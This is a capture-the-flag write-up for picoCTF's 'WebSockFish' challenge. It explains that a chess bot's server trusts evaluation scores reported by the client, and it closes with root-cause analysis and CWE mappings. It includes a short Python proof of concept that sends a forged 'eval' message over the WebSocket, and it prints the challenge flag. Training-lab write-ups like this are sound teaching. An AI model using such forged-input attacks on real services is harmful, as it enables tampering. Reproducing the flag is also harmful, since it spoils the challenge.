# WebSockFish

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_5eb33d52}`

## Summary

The entire chess game (board state, legal move validation, and the Stockfish engine itself) runs
client side in the browser via `chess.js` and a `stockfish.min.js` Web Worker. The only thing
that ever crosses the WebSocket to the server is a plain text string, `"eval <n>"` or
`"mate <n>"`, built directly from whatever number the client-side engine happened to output. The
server has no independent way to verify the real board position, so it fully trusts whatever
evaluation number the client claims. Connecting to the WebSocket directly and sending a single
fabricated, extremely lopsided "eval" message is enough to make the bot "resign" and hand over
the flag, with no chess actually played.

## Discovery

The page's inline JavaScript shows the full flow: `game` (a `Chess` instance) and `stockfish` (a
Web Worker) both live entirely in the browser. The only WebSocket traffic is triggered here:

```javascript
stockfish.onmessage = function (event) {
  if (event.data.startsWith(`info depth ${DEPTH}`)) {
    var splitString = event.data.split(" ");
    if (event.data.includes("mate")) {
      message = "mate " + parseInt(splitString[9]);
    } else {
      message = "eval " + parseInt(splitString[9]);
    }
    sendMessage(message);
  }
};
```

Nothing about the actual move history, FEN, or PGN is ever sent. The server can only be reacting
to the bare `"eval N"` / `"mate N"` string, which means connecting directly to the WebSocket and
sending an arbitrary value skips the entire game.

## Proof of Concept

```python
import asyncio, websockets

async def main():
    async with websockets.connect("ws://TARGET/ws/") as ws:
        await ws.send("eval -65536")
        print(await asyncio.wait_for(ws.recv(), timeout=3))

asyncio.run(main())
```

Sending increasingly one-sided fabricated `eval`/`mate` values reveals a tiered set of canned
responses (`"pretty equal"` near 0, `"deep water"`/`"drown"` for values favoring the bot,
`"quite the chess shark"` for values favoring the player), until a sufficiently extreme negative
value crosses the server's final threshold:

```
Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_5eb33d52}
```

Along the way, sending exactly `eval 100` or `eval -100` crashes the connection outright
(WebSocket close code 1011, internal error) — a secondary bug in whatever bucket/threshold logic
selects a response message, though not needed for the main solve.

## Root Cause

Game state and outcome determination were implemented entirely on the client, with the server
acting purely as a passive relay that trusts a self-reported evaluation number. Any
security-relevant decision (who won, whether a claimed position is legitimate) must be computed
and verified server side; a client is fully under the attacker's control and will say whatever
gets the desired response.

## CWE / OWASP

- **CWE-602**: Client-Side Enforcement of Server-Side Security
- **CWE-807**: Reliance on Untrusted Inputs in a Security Decision
- **OWASP A04:2021**: Insecure Design
